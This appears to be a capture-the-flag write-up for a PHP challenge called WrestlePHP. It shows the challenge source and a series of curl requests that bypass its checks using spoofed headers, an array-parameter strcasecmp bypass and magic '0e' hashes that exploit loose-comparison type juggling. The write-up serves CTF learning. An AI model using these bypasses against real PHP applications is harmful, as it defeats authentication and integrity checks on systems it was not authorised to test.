
# 0xrabin WrestlePHP

```hacktoberfest_ctf{3qu4l17y_1s_n07_1d3nt17y_hehe_1337_0xcafebabe_cafedead}```
 Challenge Description
>Can you beat PHP?

>Here's something that could help you out
>7068702e30646179676f642e78797a

Hex Decoding 7068702e30646179676f642e78797a gives php.0daygod.xyz
On visiting the site we are greeted with source code of the chall php.

```php
 <?php

    if($_SERVER['HTTP_USER_AGENT'] != "Yes, I am a human."){
        die("You are a bot, mate!");
    } else echo "Nice! Now that we know you are a human, you can proceed further.\n\n";

    $flag = array("hacktoberfest_ctf{");
    if(apache_request_headers()["Sagarmatha-Hacktoberfest-CTF"] == "https://hacktober.tk/"){
        array_push($flag, "you");
    }
    
    if(isset($_GET['hello']) && $_GET['hello'] === "hi"){
        array_push($flag, "can't");
    }
    
    if($_GET['world'] != "0x10001" && strcasecmp($_GET['world'], "0x10001") == 0){
        array_push($flag, "see");
    }
    
    if(isset($_GET['nice']) && isset($_GET['ecin']))
        if($_GET['nice'] != $_GET['ecin']){
            if(sha1($_GET['nice']) == sha1($_GET['ecin'])){            
                array_push($flag, "what");
            }        
        }
    
    if($_POST['ctf'] == md5($_POST['ctf'])){
        array_push($flag, "this");
    }
    
    if(isset($_POST['parm']) && isset($_POST['mrap'])){
        if(md5($_POST['parm']) == md5($_POST['mrap'])){
            if($_POST['parm'] != $_POST['mrap']){
                array_push($flag, "contains!");
            }
        }
    }
    
    array_push($flag, "}");
    
    echo implode('', $flag);
    
?> 

```


So lets follow along the source and solve the puzzle.
```php
if($_SERVER['HTTP_USER_AGENT'] != "Yes, I am a human."){
       die("You are a bot, mate!");
   } else echo "Nice! Now that we know you are a human, you can proceed further.\n\n";
  ```

First things first we need set out user-agent to "Yes, I am a human."

`curl -A "Yes, I am a human." https://php.0daygod.xyz/`




```php
if(apache_request_headers()["Sagarmatha-Hacktoberfest-CTF"] == "https://hacktober.tk/"){
       array_push($flag, "you");
   }
  ```
Now we need to add a header `Sagarmatha-Hacktoberfest-CTF` with value `https://hacktober.tk/`
  
`curl -A "Yes, I am a human." https://php.0daygod.xyz/ -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`
  



```php
   if(isset($_GET['hello']) && $_GET['hello'] === "hi"){
       array_push($flag, "can't");
   }
```
 we need to add a get variable hello and set its value to hi
 
`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi" -"Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`
 
```php
   if($_GET['world'] != "0x10001" && strcasecmp($_GET['world'], "0x10001") == 0){
       array_push($flag, "see");
   }
```

So here the flag part gets appended when get value of world is not equal to 0x10001 but also on the second part of if statement for it to be 0 world must be 0x10001
Luckily there is a bug for strcmp , strcasecmp where we can pass [] to bypass the check.
`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`


  
```php 
    if(isset($_GET['nice']) && isset($_GET['ecin']))
       if($_GET['nice'] != $_GET['ecin']){
           if(sha1($_GET['nice']) == sha1($_GET['ecin'])){            
               array_push($flag, "what");
           }        
       }
```


Here we need to pass two `get` params `nice` and `ecin` with different values but their sha1 values should be same in order for flag to be appended.
We use use the type juggling vulnerability here and pass two different value of nice and ecin but the  beginning part of their sha1 should match containg 0e.
From this [list](https://raw.githubusercontent.com/spaze/hashes/master/sha1.md) I was able to find such two words.
So lets pass them

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/"`



Similarly 
```php
if($_POST['ctf'] == md5($_POST['ctf'])){
       array_push($flag, "this");
   }
```
Here we need find simlar value of ctf like in step above and pass it by POST
`md5(0e215962017) = 0e291242476940776845150308577824`

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017"`


```php if(isset($_POST['parm']) && isset($_POST['mrap'])){
       if(md5($_POST['parm']) == md5($_POST['mrap'])){
           if($_POST['parm'] != $_POST['mrap']){
               array_push($flag, "contains!");
           }
       }
   }
```
Similarly for the last piece of code we find such two words `hello24343860700` and `hello24034989169` and pass those values to post params parm and mrap

`curl -A "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017&parm=hello24343860700&mrap=hello24034989169"`

And thus the final one liner 
`curl -sA "Yes, I am a human." "https://php.0daygod.xyz/?hello=hi&world[]=haha&nice=aaroZmOk&ecin=aaK1STfY" -H "Sagarmatha-Hacktoberfest-CTF: https://hacktober.tk/" --data "ctf=0e215962017&parm=hello24343860700&mrap=hello24034989169"|grep -oE "Flag: hacktoberfest_ctf{.*}"`

```Flag: hacktoberfest_ctf{3qu4l17y_1s_n07_1d3nt17y_hehe_1337_0xcafebabe_cafedead}```


